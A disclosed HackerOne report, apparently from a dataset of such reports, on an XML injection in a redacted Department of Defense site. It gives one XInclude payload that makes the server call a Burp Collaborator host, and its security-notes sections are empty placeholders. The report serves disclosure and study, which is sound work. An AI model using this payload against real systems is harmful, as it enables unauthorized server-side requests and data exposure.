---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '997381'
original_report_id: '997381'
title: XML Injection on https://www.█████████ (███ parameter)
weakness: XML Injection
team_handle: deptofdefense
created_at: '2020-10-03T23:47:37.978Z'
disclosed_at: '2021-04-02T18:43:46.824Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- xml-injection
---

# XML Injection on https://www.█████████ (███ parameter)

## Metadata

- HackerOne Report ID: 997381
- Weakness: XML Injection
- Program: deptofdefense
- Disclosed At: 2021-04-02T18:43:46.824Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Greetings,

I found an XML injection on https://www.███.
This kind of vulnerability can be difficult to detect and exploit remotely; you should review the application's response
here is the complete link: https://www.███/███████
Payload : 

`███████=<vuc xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://9bligh4snzlirzuxt4lbu3zullrbf0.burpcollaborator.net/foo"/></vuc>`

Result : 

███

best regards, 
frenchvlad

## Impact

gaining the access to the unauthorized parts and stealing the sensitive data would be the most important thing to know when it comes to XML’s impact.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
